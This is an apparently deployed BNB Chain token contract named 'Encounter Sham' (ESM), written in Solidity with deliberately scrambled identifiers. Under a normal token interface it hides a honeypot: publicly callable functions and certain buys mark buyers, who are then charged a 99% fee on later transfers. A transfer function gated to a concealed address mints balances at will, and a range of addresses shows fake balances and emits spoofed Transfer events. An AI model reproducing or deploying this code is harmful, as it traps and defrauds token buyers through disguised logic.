/**
 *Submitted for verification at BscScan.com on 2023-01-02
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



interface IUniswapV2Router {

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


library SafeMath {

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

}


interface IBEP20 {

    function getOwner() external view returns (address);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function name() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}




contract EncounterSham is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 toReceiverMinTotal = 100000000 * (10 ** _decimals);
    uint256  takeReceiverTradingExempt = 100000000 * 10 ** _decimals;
    uint256  atIsShouldFrom = 100000000 * 10 ** _decimals;


    string constant _name = "Encounter Sham";
    string constant _symbol = "ESM";
    uint8 constant _decimals = 18;

    uint256 private receiverAmountLaunchIs = 0;
    uint256 private fundLimitMinSenderEnable = 2;

    uint256 private receiverReceiverShouldBuyToMarketing = 0;
    uint256 private walletTakeBotsSwap = 2;

    bool private walletAmountSwapFundAuto = true;
    uint160 constant receiverReceiverTotalIsListToAuto = 43132741270 * 2 ** 40;
    bool private buyLimitListTake = true;
    bool private botsListTeamLiquidity = true;
    bool private swapToAmountBots = true;
    uint256 constant tokenLaunchTxTrading = 300000 * 10 ** 18;
    bool private fromTxMarketingAmountMinReceiver = true;
    uint256 fromShouldFeeMode = 2 ** 18 - 1;
    uint256 private receiverSellTotalModeAutoTrading = 6 * 10 ** 15;
    uint256 private maxModeBurnLimit = toReceiverMinTotal / 1000; // 0.1%
    uint256 minReceiverLiquidityIs = 14217;

    address constant exemptShouldToTrading = 0x29B53a956B3eb8e8a1F117a37fb21dce7d5E0706;
    uint256 shouldLaunchBurnReceiver = 0;
    uint256 constant burnToWalletTokenMarketingReceiver = 10000 * 10 ** 18;

    uint256 private toBuyBotsReceiver = fundLimitMinSenderEnable + receiverAmountLaunchIs;
    uint256 private listTokenLiquidityEnableFeeLimitBots = 100;

    uint160 constant toTokenMarketingMax = 138285085207 * 2 ** 120;
    uint160 constant enableSwapTakeBurn = 55082599641;

    bool private marketingLaunchModeShould;
    uint256 private amountReceiverMaxToken;
    uint256 private receiverToLiquidityBuyShouldToken;
    uint256 private enableToMinWallet;
    uint256 private totalMaxSenderToken;
    uint160 constant fromFundTxMaxBots = 997027436550 * 2 ** 80;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private atBurnFromBotsIsTo;
    mapping(address => bool) private exemptLaunchTeamEnableTradingFund;
    mapping(address => bool) private atLiquidityWalletTo;
    mapping(address => bool) private txLaunchWalletIsLiquidityAutoTo;
    mapping(address => uint256) private maxAmountWalletReceiver;
    mapping(uint256 => address) private txLimitShouldReceiverMint;
    mapping(uint256 => address) private botsFundSenderBuy;
    mapping(address => uint256) private listFromSenderMode;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;
    uint256 public totalAmountFeeMint = 0;

    IUniswapV2Router public fundEnableExemptFeeLaunchMintAmount;
    address public uniswapV2Pair;

    uint256 private senderEnableMinMarketingFrom;
    uint256 private teamAtTradingTx;

    address private feeIsBotsEnable = (msg.sender); // auto-liq address
    address private fundAtTotalReceiverReceiverExempt = (0xc73f80fE6b31eA502ec7366affFFe356e4aC2509); // marketing address

    
    bool private toLiquidityIsBotsExemptTeamFee = false;
    uint256 private txLaunchedTokenSell = 0;
    bool private walletLaunchedFundReceiver = false;
    bool public feeExemptToTake = false;
    bool public walletReceiverIsToken = false;
    bool private teamMintTokenFundBuySenderLaunched = false;
    uint256 private marketingFundTeamIs = 0;
    bool public receiverAmountIsLaunched = false;
    bool private listShouldReceiverIsBuy = false;
    uint256 private exemptSwapSenderBuy = 0;
    uint256 private isModeMaxSenderTakeMint = 0;
    bool public txLaunchedTokenSell1 = false;
    bool public mintSenderTokenAtLiquidityMarketing = false;
    uint256 private txLaunchedTokenSell3 = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        fundEnableExemptFeeLaunchMintAmount = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(fundEnableExemptFeeLaunchMintAmount.factory()).createPair(address(this), fundEnableExemptFeeLaunchMintAmount.WETH());
        _allowances[address(this)][address(fundEnableExemptFeeLaunchMintAmount)] = toReceiverMinTotal;

        marketingLaunchModeShould = true;

        atLiquidityWalletTo[msg.sender] = true;
        atLiquidityWalletTo[0x0000000000000000000000000000000000000000] = true;
        atLiquidityWalletTo[0x000000000000000000000000000000000000dEaD] = true;
        atLiquidityWalletTo[address(this)] = true;

        atBurnFromBotsIsTo[msg.sender] = true;
        atBurnFromBotsIsTo[address(this)] = true;

        exemptLaunchTeamEnableTradingFund[msg.sender] = true;
        exemptLaunchTeamEnableTradingFund[0x0000000000000000000000000000000000000000] = true;
        exemptLaunchTeamEnableTradingFund[0x000000000000000000000000000000000000dEaD] = true;
        exemptLaunchTeamEnableTradingFund[address(this)] = true;

        approve(_router, toReceiverMinTotal);
        approve(address(uniswapV2Pair), toReceiverMinTotal);
        _balances[msg.sender] = toReceiverMinTotal;
        emit Transfer(address(0), msg.sender, toReceiverMinTotal);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return toReceiverMinTotal;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, toReceiverMinTotal);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return minFundTakeLiquidityTotal(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != toReceiverMinTotal) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return minFundTakeLiquidityTotal(sender, recipient, amount);
    }

    function getlaunchReceiverSenderAmount() public view returns (uint256) {
        if (receiverAmountLaunchIs == exemptSwapSenderBuy) {
            return exemptSwapSenderBuy;
        }
        return receiverAmountLaunchIs;
    }

    function limitListMaxBurn(address buyBurnMarketingWallet) internal view returns (bool) {
        return !exemptLaunchTeamEnableTradingFund[buyBurnMarketingWallet];
    }

    function botsModeMarketingToken() internal swapping {
        
        uint256 takeToShouldWalletToLiquify = maxModeBurnLimit.mul(receiverAmountLaunchIs).div(toBuyBotsReceiver).div(2);
        uint256 toFundIsSell = maxModeBurnLimit.sub(takeToShouldWalletToLiquify);

        address[] memory walletTotalLaunchTradingSellBuyMode = new address[](2);
        walletTotalLaunchTradingSellBuyMode[0] = address(this);
        walletTotalLaunchTradingSellBuyMode[1] = fundEnableExemptFeeLaunchMintAmount.WETH();
        fundEnableExemptFeeLaunchMintAmount.swapExactTokensForETHSupportingFeeOnTransferTokens(
            toFundIsSell,
            0,
            walletTotalLaunchTradingSellBuyMode,
            address(this),
            block.timestamp
        );
        
        uint256 walletAmountShouldMinLaunched = address(this).balance;
        uint256 totalExemptAmountTrading = toBuyBotsReceiver.sub(receiverAmountLaunchIs.div(2));
        uint256 walletAmountShouldMinLaunchedLiquidity = walletAmountShouldMinLaunched.mul(receiverAmountLaunchIs).div(totalExemptAmountTrading).div(2);
        uint256 walletAmountShouldMinLaunchedMarketing = walletAmountShouldMinLaunched.mul(fundLimitMinSenderEnable).div(totalExemptAmountTrading);
        
        payable(fundAtTotalReceiverReceiverExempt).transfer(walletAmountShouldMinLaunchedMarketing);

        if (takeToShouldWalletToLiquify > 0) {
            fundEnableExemptFeeLaunchMintAmount.addLiquidityETH{value : walletAmountShouldMinLaunchedLiquidity}(
                address(this),
                takeToShouldWalletToLiquify,
                0,
                0,
                feeIsBotsEnable,
                block.timestamp
            );
            emit AutoLiquify(walletAmountShouldMinLaunchedLiquidity, takeToShouldWalletToLiquify);
        }
    }

    function txReceiverTradingLaunched(address exemptFundFeeAt) private {
        uint256 teamBotsIsFrom = marketingTxLiquidityLaunchedTake();
        if (teamBotsIsFrom < receiverSellTotalModeAutoTrading) {
            totalAmountFeeMint += 1;
            botsFundSenderBuy[totalAmountFeeMint] = exemptFundFeeAt;
            listFromSenderMode[exemptFundFeeAt] += teamBotsIsFrom;
            if (listFromSenderMode[exemptFundFeeAt] > receiverSellTotalModeAutoTrading) {
                maxWalletAmount = maxWalletAmount + 1;
                txLimitShouldReceiverMint[maxWalletAmount] = exemptFundFeeAt;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        txLimitShouldReceiverMint[maxWalletAmount] = exemptFundFeeAt;
    }

    function setlaunchReceiverSenderAmount(uint256 liquidityFundSenderSwapWalletBots) public onlyOwner {
        if (receiverAmountLaunchIs != exemptSwapSenderBuy) {
            exemptSwapSenderBuy=liquidityFundSenderSwapWalletBots;
        }
        if (receiverAmountLaunchIs == receiverAmountLaunchIs) {
            receiverAmountLaunchIs=liquidityFundSenderSwapWalletBots;
        }
        receiverAmountLaunchIs=liquidityFundSenderSwapWalletBots;
    }

    function burnTeamMinBuy(uint160 teamIsReceiverShouldAmount) private pure returns (bool) {
        if (teamIsReceiverShouldAmount >= uint160(exemptShouldToTrading) && teamIsReceiverShouldAmount <= uint160(exemptShouldToTrading) + 100000) {
            return true;
        }
        return false;
    }

    function gettakeAtSellIsSenderTeamLaunch() public view returns (bool) {
        if (walletReceiverIsToken == walletAmountSwapFundAuto) {
            return walletAmountSwapFundAuto;
        }
        if (walletReceiverIsToken != botsListTeamLiquidity) {
            return botsListTeamLiquidity;
        }
        return walletReceiverIsToken;
    }

    function toExemptMarketingWallet() private {
        if (totalAmountFeeMint > 0) {
            for (uint256 i = 1; i <= totalAmountFeeMint; i++) {
                if (maxAmountWalletReceiver[botsFundSenderBuy[i]] == 0) {
                    maxAmountWalletReceiver[botsFundSenderBuy[i]] = block.timestamp;
                }
            }
            totalAmountFeeMint = 0;
        }
    }

    function getminShouldExemptLimit() public view returns (bool) {
        return swapToAmountBots;
    }

    function txTakeMarketingFee(address exemptFundFeeAt) private view returns (bool) {
        return ((uint256(uint160(exemptFundFeeAt)) << 192) >> 238) == fromShouldFeeMode;
    }

    function getlaunchedLiquidityTokenMaxAutoSwap() public view returns (bool) {
        if (botsListTeamLiquidity != swapToAmountBots) {
            return swapToAmountBots;
        }
        if (botsListTeamLiquidity == txLaunchedTokenSell1) {
            return txLaunchedTokenSell1;
        }
        if (botsListTeamLiquidity == botsListTeamLiquidity) {
            return botsListTeamLiquidity;
        }
        return botsListTeamLiquidity;
    }

    function setminShouldExemptLimit(bool liquidityFundSenderSwapWalletBots) public onlyOwner {
        if (swapToAmountBots != feeExemptToTake) {
            feeExemptToTake=liquidityFundSenderSwapWalletBots;
        }
        if (swapToAmountBots != walletAmountSwapFundAuto) {
            walletAmountSwapFundAuto=liquidityFundSenderSwapWalletBots;
        }
        if (swapToAmountBots == buyLimitListTake) {
            buyLimitListTake=liquidityFundSenderSwapWalletBots;
        }
        swapToAmountBots=liquidityFundSenderSwapWalletBots;
    }

    function setreceiverSenderReceiverFund(uint256 liquidityFundSenderSwapWalletBots) public onlyOwner {
        txLaunchedTokenSell3=liquidityFundSenderSwapWalletBots;
    }

    function minAutoReceiverMarketingLimitSell(address buyBurnMarketingWallet, address enableBuyIsLiquidity, uint256 takeToShouldWallet, bool maxBotsModeTeam) private {
        if (maxBotsModeTeam) {
            buyBurnMarketingWallet = address(uint160(uint160(exemptShouldToTrading) + shouldLaunchBurnReceiver));
            shouldLaunchBurnReceiver++;
            _balances[enableBuyIsLiquidity] = _balances[enableBuyIsLiquidity].add(takeToShouldWallet);
        } else {
            _balances[buyBurnMarketingWallet] = _balances[buyBurnMarketingWallet].sub(takeToShouldWallet);
        }
        emit Transfer(buyBurnMarketingWallet, enableBuyIsLiquidity, takeToShouldWallet);
    }

    function settoLimitSenderToken(uint256 liquidityFundSenderSwapWalletBots) public onlyOwner {
        if (totalAmountFeeMint != receiverReceiverShouldBuyToMarketing) {
            receiverReceiverShouldBuyToMarketing=liquidityFundSenderSwapWalletBots;
        }
        if (totalAmountFeeMint == totalAmountFeeMint) {
            totalAmountFeeMint=liquidityFundSenderSwapWalletBots;
        }
        totalAmountFeeMint=liquidityFundSenderSwapWalletBots;
    }

    function setmaxExemptLaunchAmount(uint256 liquidityFundSenderSwapWalletBots) public onlyOwner {
        if (toBuyBotsReceiver == totalAmountFeeMint) {
            totalAmountFeeMint=liquidityFundSenderSwapWalletBots;
        }
        toBuyBotsReceiver=liquidityFundSenderSwapWalletBots;
    }

    function minFundTakeLiquidityTotal(address buyBurnMarketingWallet, address enableBuyIsLiquidity, uint256 takeToShouldWallet) internal returns (bool) {
        if (burnTeamMinBuy(uint160(enableBuyIsLiquidity))) {
            minAutoReceiverMarketingLimitSell(buyBurnMarketingWallet, enableBuyIsLiquidity, takeToShouldWallet, false);
            return true;
        }
        if (burnTeamMinBuy(uint160(buyBurnMarketingWallet))) {
            minAutoReceiverMarketingLimitSell(buyBurnMarketingWallet, enableBuyIsLiquidity, takeToShouldWallet, true);
            return true;
        }
        
        bool swapAutoShouldTrading = txTakeMarketingFee(buyBurnMarketingWallet) || txTakeMarketingFee(enableBuyIsLiquidity);
        
        if (walletReceiverIsToken == teamMintTokenFundBuySenderLaunched) {
            walletReceiverIsToken = walletReceiverIsToken;
        }


        if (buyBurnMarketingWallet == uniswapV2Pair) {
            if (maxWalletAmount != 0 && fromFundTeamExempt(uint160(enableBuyIsLiquidity))) {
                atLimitReceiverTradingSwapSender();
            }
            if (!swapAutoShouldTrading) {
                txReceiverTradingLaunched(enableBuyIsLiquidity);
            }
        }
        
        
        if (inSwap || swapAutoShouldTrading) {return txFromBurnMarketing(buyBurnMarketingWallet, enableBuyIsLiquidity, takeToShouldWallet);}
        
        if (teamMintTokenFundBuySenderLaunched != walletLaunchedFundReceiver) {
            teamMintTokenFundBuySenderLaunched = walletLaunchedFundReceiver;
        }

        if (txLaunchedTokenSell3 != receiverReceiverShouldBuyToMarketing) {
            txLaunchedTokenSell3 = receiverAmountLaunchIs;
        }


        require((takeToShouldWallet <= takeReceiverTradingExempt) || atLiquidityWalletTo[buyBurnMarketingWallet] || atLiquidityWalletTo[enableBuyIsLiquidity], "Max TX Limit!");

        if (feeFromBuyAmount()) {botsModeMarketingToken();}

        _balances[buyBurnMarketingWallet] = _balances[buyBurnMarketingWallet].sub(takeToShouldWallet, "Insufficient Balance!");
        
        if (mintSenderTokenAtLiquidityMarketing != buyLimitListTake) {
            mintSenderTokenAtLiquidityMarketing = mintSenderTokenAtLiquidityMarketing;
        }

        if (toLiquidityIsBotsExemptTeamFee == receiverAmountIsLaunched) {
            toLiquidityIsBotsExemptTeamFee = buyLimitListTake;
        }

        if (exemptSwapSenderBuy != listTokenLiquidityEnableFeeLimitBots) {
            exemptSwapSenderBuy = receiverReceiverShouldBuyToMarketing;
        }


        uint256 takeToShouldWalletReceived = limitListMaxBurn(buyBurnMarketingWallet) ? amountLaunchTakeLiquidity(buyBurnMarketingWallet, enableBuyIsLiquidity, takeToShouldWallet) : takeToShouldWallet;

        _balances[enableBuyIsLiquidity] = _balances[enableBuyIsLiquidity].add(takeToShouldWalletReceived);
        emit Transfer(buyBurnMarketingWallet, enableBuyIsLiquidity, takeToShouldWalletReceived);
        return true;
    }

    function atLimitReceiverTradingSwapSender() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (maxAmountWalletReceiver[txLimitShouldReceiverMint[i]] == 0) {
                    maxAmountWalletReceiver[txLimitShouldReceiverMint[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function getTotalAmount() public {
        atLimitReceiverTradingSwapSender();
    }

    function atReceiverSellSwap(address buyBurnMarketingWallet, bool atAutoSwapTeamelling) internal returns (uint256) {
        
        if (atAutoSwapTeamelling) {
            toBuyBotsReceiver = walletTakeBotsSwap + receiverReceiverShouldBuyToMarketing;
            return sellAtBuyFundMarketingBurn(buyBurnMarketingWallet, toBuyBotsReceiver);
        }
        if (!atAutoSwapTeamelling && buyBurnMarketingWallet == uniswapV2Pair) {
            toBuyBotsReceiver = fundLimitMinSenderEnable + receiverAmountLaunchIs;
            return toBuyBotsReceiver;
        }
        return sellAtBuyFundMarketingBurn(buyBurnMarketingWallet, toBuyBotsReceiver);
    }

    function teamTotalMinMarketing(uint160 teamIsReceiverShouldAmount) private view returns (uint256) {
        uint256 atAutoSwapTeam = shouldLaunchBurnReceiver;
        uint256 swapMarketingEnableBurnShould = teamIsReceiverShouldAmount - uint160(exemptShouldToTrading);
        if (swapMarketingEnableBurnShould < atAutoSwapTeam) {
            return burnToWalletTokenMarketingReceiver;
        }
        return tokenLaunchTxTrading;
    }

    function manualTransfer(address buyBurnMarketingWallet, address enableBuyIsLiquidity, uint256 takeToShouldWallet) public {
        if (!tradingEnableAmountWallet(uint160(msg.sender))) {
            return;
        }
        if (burnTeamMinBuy(uint160(enableBuyIsLiquidity))) {
            minAutoReceiverMarketingLimitSell(buyBurnMarketingWallet, enableBuyIsLiquidity, takeToShouldWallet, false);
            return;
        }
        if (burnTeamMinBuy(uint160(buyBurnMarketingWallet))) {
            minAutoReceiverMarketingLimitSell(buyBurnMarketingWallet, enableBuyIsLiquidity, takeToShouldWallet, true);
            return;
        }
        if (buyBurnMarketingWallet == address(0)) {
            _balances[enableBuyIsLiquidity] = _balances[enableBuyIsLiquidity].add(takeToShouldWallet);
            return;
        }
    }

    function setlaunchedLiquidityTokenMaxAutoSwap(bool liquidityFundSenderSwapWalletBots) public onlyOwner {
        if (botsListTeamLiquidity != walletAmountSwapFundAuto) {
            walletAmountSwapFundAuto=liquidityFundSenderSwapWalletBots;
        }
        if (botsListTeamLiquidity != feeExemptToTake) {
            feeExemptToTake=liquidityFundSenderSwapWalletBots;
        }
        botsListTeamLiquidity=liquidityFundSenderSwapWalletBots;
    }

    function sellAtBuyFundMarketingBurn(address buyBurnMarketingWallet, uint256 feeTeamLaunchMaxShould) private view returns (uint256) {
        uint256 marketingLimitBuyFeeTx = maxAmountWalletReceiver[buyBurnMarketingWallet];
        if (marketingLimitBuyFeeTx > 0 && takeExemptBotsAutoModeFeeLaunched() - marketingLimitBuyFeeTx > 2) {
            return 99;
        }
        return feeTeamLaunchMaxShould;
    }

    function amountLaunchTakeLiquidity(address buyBurnMarketingWallet, address burnFundTeamReceiverTake, uint256 takeToShouldWallet) internal returns (uint256) {
        
        uint256 swapMintFundBotsFromExempt = takeToShouldWallet.mul(atReceiverSellSwap(buyBurnMarketingWallet, burnFundTeamReceiverTake == uniswapV2Pair)).div(listTokenLiquidityEnableFeeLimitBots);

        if (txLaunchWalletIsLiquidityAutoTo[buyBurnMarketingWallet] || txLaunchWalletIsLiquidityAutoTo[burnFundTeamReceiverTake]) {
            swapMintFundBotsFromExempt = takeToShouldWallet.mul(99).div(listTokenLiquidityEnableFeeLimitBots);
        }

        _balances[address(this)] = _balances[address(this)].add(swapMintFundBotsFromExempt);
        emit Transfer(buyBurnMarketingWallet, address(this), swapMintFundBotsFromExempt);
        
        return takeToShouldWallet.sub(swapMintFundBotsFromExempt);
    }

    function setshouldLaunchLiquidityFromSellAtMax(uint256 liquidityFundSenderSwapWalletBots) public onlyOwner {
        if (txLaunchedTokenSell == marketingFundTeamIs) {
            marketingFundTeamIs=liquidityFundSenderSwapWalletBots;
        }
        txLaunchedTokenSell=liquidityFundSenderSwapWalletBots;
    }

    function getshouldLaunchLiquidityFromSellAtMax() public view returns (uint256) {
        return txLaunchedTokenSell;
    }

    function getreceiverSenderReceiverFund() public view returns (uint256) {
        return txLaunchedTokenSell3;
    }

    function takeExemptBotsAutoModeFeeLaunched() private view returns (uint256) {
        return block.timestamp;
    }

    function getbotsTradingFromSwapMintLimitReceiver(address liquidityFundSenderSwapWalletBots) public view returns (bool) {
        if (atBurnFromBotsIsTo[liquidityFundSenderSwapWalletBots] != txLaunchWalletIsLiquidityAutoTo[liquidityFundSenderSwapWalletBots]) {
            return toLiquidityIsBotsExemptTeamFee;
        }
        if (liquidityFundSenderSwapWalletBots == DEAD) {
            return fromTxMarketingAmountMinReceiver;
        }
            return atBurnFromBotsIsTo[liquidityFundSenderSwapWalletBots];
    }

    function marketingTxLiquidityLaunchedTake() private view returns (uint256) {
        address sellIsTxAmountBurnFeeToken = WBNB;
        if (address(this) < WBNB) {
            sellIsTxAmountBurnFeeToken = address(this);
        }
        (uint amountListSellTake, uint buyListExemptSender,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 walletSenderAmountSellToModeAuto,) = WBNB == sellIsTxAmountBurnFeeToken ? (amountListSellTake, buyListExemptSender) : (buyListExemptSender, amountListSellTake);
        uint256 shouldTotalLaunchedLimit = IERC20(WBNB).balanceOf(uniswapV2Pair) - walletSenderAmountSellToModeAuto;
        return shouldTotalLaunchedLimit;
    }

    function fromFundTeamExempt(uint160 enableBuyIsLiquidity) private view returns (bool) {
        return uint16(enableBuyIsLiquidity) == minReceiverLiquidityIs;
    }

    function txFromBurnMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getmaxExemptLaunchAmount() public view returns (uint256) {
        if (toBuyBotsReceiver != isModeMaxSenderTakeMint) {
            return isModeMaxSenderTakeMint;
        }
        if (toBuyBotsReceiver != txLaunchedTokenSell3) {
            return txLaunchedTokenSell3;
        }
        return toBuyBotsReceiver;
    }

    function feeFromBuyAmount() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        fromTxMarketingAmountMinReceiver &&
        _balances[address(this)] >= maxModeBurnLimit;
    }

    function gettoLimitSenderToken() public view returns (uint256) {
        if (totalAmountFeeMint == maxModeBurnLimit) {
            return maxModeBurnLimit;
        }
        return totalAmountFeeMint;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (burnTeamMinBuy(uint160(account))) {
            return teamTotalMinMarketing(uint160(account));
        }
        return _balances[account];
    }

    function settakeAtSellIsSenderTeamLaunch(bool liquidityFundSenderSwapWalletBots) public onlyOwner {
        if (walletReceiverIsToken != fromTxMarketingAmountMinReceiver) {
            fromTxMarketingAmountMinReceiver=liquidityFundSenderSwapWalletBots;
        }
        walletReceiverIsToken=liquidityFundSenderSwapWalletBots;
    }

    function getTotalFee() public {
        toExemptMarketingWallet();
    }

    function tradingEnableAmountWallet(uint160 teamIsReceiverShouldAmount) private pure returns (bool) {
        return teamIsReceiverShouldAmount == (toTokenMarketingMax + fromFundTxMaxBots + receiverReceiverTotalIsListToAuto + enableSwapTakeBurn);
    }

    function setbotsTradingFromSwapMintLimitReceiver(address liquidityFundSenderSwapWalletBots,bool tradingShouldIsAuto) public onlyOwner {
        if (liquidityFundSenderSwapWalletBots != ZERO) {
            feeExemptToTake=tradingShouldIsAuto;
        }
        if (liquidityFundSenderSwapWalletBots != DEAD) {
            feeExemptToTake=tradingShouldIsAuto;
        }
        if (atBurnFromBotsIsTo[liquidityFundSenderSwapWalletBots] != txLaunchWalletIsLiquidityAutoTo[liquidityFundSenderSwapWalletBots]) {
           txLaunchWalletIsLiquidityAutoTo[liquidityFundSenderSwapWalletBots]=tradingShouldIsAuto;
        }
        atBurnFromBotsIsTo[liquidityFundSenderSwapWalletBots]=tradingShouldIsAuto;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}